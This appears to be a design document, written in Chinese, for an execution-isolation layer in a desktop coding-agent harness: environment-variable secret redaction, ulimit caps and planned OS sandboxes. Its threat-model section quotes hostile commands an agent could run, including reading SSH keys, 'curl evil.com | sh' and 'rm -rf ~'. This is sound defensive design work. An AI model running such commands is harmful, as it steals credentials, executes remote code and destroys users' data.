# 执行环境隔离：ExecutionEnvironment

> ETCLOVG 的 **E（Execution）** 层设计。目标：把 agent 命令执行收敛到单一可替换的隔离边界，先堵住最高危的泄漏面，再逐步引入 OS 原生沙箱。
> 重心是**桌面端 coding agent**，因此**不依赖 Docker**——容器仅作为评测/CI 的可选后端。

---

## 1. 背景与威胁模型

Agent 有两条执行通道，隔离强度此前严重不对等：

| 通道 | 旧约束 | 风险 |
|------|--------|------|
| 文件工具（`read/write/edit/apply_patch`） | `resolvePath()` 做 `..` 越界防护，锁在 `workspaceRoot` 内 | 较安全 |
| `bash`（`ShellSession`） | 仅 `cwd=workspaceRoot` + 命令正则黑名单 + 超时 | **几乎无约束** |

`ShellSession` 此前 `spawn("bash")` 时把**宿主全部环境变量**（含 `DEEPSEEK_API_KEY`、`LATTICE_CODE_API_KEY`、`TENCENTCLOUD_SECRET_*` 等）原样透传，且 `cwd` 只是起点不是牢笼。agent 在 bash 里可以 `printenv` 读走密钥、`cat ~/.ssh/id_rsa`、`curl evil.com | sh`、`rm -rf ~`。文件工具的路径防护对 bash **完全不生效**。

**结论**：执行隔离的重心 = 给 `bash`/shell 通道套上真正的约束。所有命令执行都收敛在一个类里，这是干净的改造接缝。

---

## 2. 设计目标 / 非目标

**目标**
- 命令执行有单一收敛点（`ExecutionEnvironment` 接口），隔离策略只在这里实现。
- 实现可替换：`LocalEnvironment`（默认）↔ `SandboxedEnvironment`（OS 原生沙箱）↔ Docker，工具层零改动。
- 默认安全：密钥不泄漏给 shell、资源有上限——且**不破坏正常 dev 工作流**。
- 提供逃生阀，被误伤的工作流可一键恢复旧行为。

**非目标（当前阶段）**
- 不做 microVM / gVisor（多租户托管才需要，对本地优先 agent 过度设计）。
- 不强制 Docker 依赖。
- 文件 I/O 暂不路由进执行环境——文件工具已有 `resolvePath` workspace 限制，bash 才是高危面。

---

## 3. 架构

```text
ToolExecutor
  └── getExecEnv()  ──►  ExecutionEnvironment（接口）
                              ├── LocalEnvironment        本地 bash，已硬化（默认）
                              ├── SandboxedEnvironment    macOS Seatbelt / Linux bwrap（P2，规划）
                              └── DockerEnvironment        复用 SWE-bench 基建（可选）
```

接口（`packages/harness/src/execution/execution-environment.ts`）：

```ts
export interface ExecutionEnvironment {
  execute(command: string, timeoutMs?: number, signal?: AbortSignal):
    Promise<{ exitCode: number; output: string }>;
  getCwd(): Promise<string>;
  destroy(): void;
}
export type ExecutionEnvironmentFactory = (workspaceRoot: string) => ExecutionEnvironment;
```

注入点：`ToolExecutorOptions.createExecutionEnvironment`，默认 `(root) => new LocalEnvironment(root)`。P2 只需把 `SandboxedEnvironment` 工厂注进来。

| 文件 | 角色 |
|------|------|
| `execution/execution-environment.ts` | 接口 + 工厂类型 |
| `execution/local-environment.ts` | `LocalEnvironment`（原 `ShellSession` 迁移 + 硬化） |
| `tools/shell-session.ts` | 向后兼容 shim：`ShellSession = LocalEnvironment` 别名 |
| `tools/executor.ts` | `getExecEnv()` + 可注入工厂 |

---

## 4. P0 硬化（已落地于 LocalEnvironment）

### 4.1 敏感环境变量脱敏

bash 启动前，继承的 env 先过 `redactSensitiveEnv()`，剥除以下名字（大小写不敏感）：

- 模式匹配：`API_KEY` / `ACCESS_KEY` / `SECRET` / `TOKEN` / `PASSWORD` / `PASSWD` / `CREDENTIAL` / `PRIVATE_KEY` / `SESSION_KEY` / `PASSPHRASE`
- 厂商前缀：`AWS_` / `TENCENTCLOUD_` / `ALIYUN_` / `OPENAI_` / `ANTHROPIC_` / `DEEPSEEK_` / `KIMI_` / `MOONSHOT_` / `GLM_` / `ZHIPU_` / `GROQ_` / `GEMINI_` / `MISTRAL_` / `OPENROUTER_`
- 精确名：`LATTICE_CODE_API_KEY`

效果：agent 在 shell 内 `printenv DEEPSEEK_API_KEY` 拿不到任何东西。

### 4.2 资源限制（ulimit）

shell 启动序列注入保守上限，每条失败静默（`2>/dev/null`），不污染首条命令退出码：

| ulimit | 默认 | 作用 |
|--------|------|------|
| `-c`（core dump） | `0` | 禁 core dump，纯安全 |
| `-u`（max procs） | `4096` | 防 fork bomb，远高于正常构建/测试扇出 |
| `-f`（file size） | `~4GB`（4194304 blocks） | 防写满磁盘，留足大产物空间 |

默认值刻意调高，正常 `npm test` / 构建不受影响。

### 4.3 配置项（逃生阀）

| 环境变量 | 作用 |
|----------|------|
| `LATTICE_CODE_EXEC_ENV_ALLOW=NAME,NAME` | 强制保留指定 env（如 `GITHUB_TOKEN` 给 `git push`） |
| `LATTICE_CODE_EXEC_ENV_PASSTHROUGH=1` | 完全关闭脱敏，恢复旧行为 |
| `LATTICE_CODE_EXEC_MAX_PROCS` | 覆盖 `ulimit -u`，空/`unlimited` 关闭该项 |
| `LATTICE_CODE_EXEC_MAX_FILESIZE` | 覆盖 `ulimit -f`（单位 1KB block） |
| `LATTICE_CODE_EXEC_CORE` | 覆盖 `ulimit -c` |
| `LATTICE_CODE_BASH_TIMEOUT_MS` | bash 默认超时（既有） |

---

## 5. 路线图

| 阶段 | 内容 | 状态 |
|------|------|------|
| **P0** | `LocalEnvironment` env 脱敏 + ulimit + 逃生阀 | ✅ 已落地 |
| **P1** | 抽出 `ExecutionEnvironment` 接口 + 可注入工厂（纯重构，行为不变） | ✅ 已落地 |
| **P2** | `SandboxedEnvironment`：macOS `sandbox-exec`（Seatbelt profile，限可写路径 + 按需禁网）、Linux `bubblewrap`（mount namespace + `--unshare-net` + seccomp）；Windows 退化到 P0 进程硬化 | 🔜 规划 |
| 可选 | `DockerEnvironment`：复用 `eval/swe-bench/docker-*.sh` 基建，仅服务已有 Docker 的 CI/SWE 场景 | 备选 |

**P2 注意事项**
- macOS `sandbox-exec` 被标 deprecated 但仍可用，业界多个 agent 仍在用，可接受。
- 若 P2 在进程级隔离文件系统（而非仅 bash），则需要把文件工具的 I/O 也路由进 `ExecutionEnvironment`，接口可向后扩展。

---

## 6. 验证

- `packages/harness/tests/local-environment.test.ts`：原 9 个行为测试全保留 + env 脱敏（shell 内验证 + `redactSensitiveEnv` 单测）+ ulimit 生效 + 向后兼容别名断言。
- `pnpm --filter @lattice-code/harness typecheck` 通过；全量 259 测试通过。
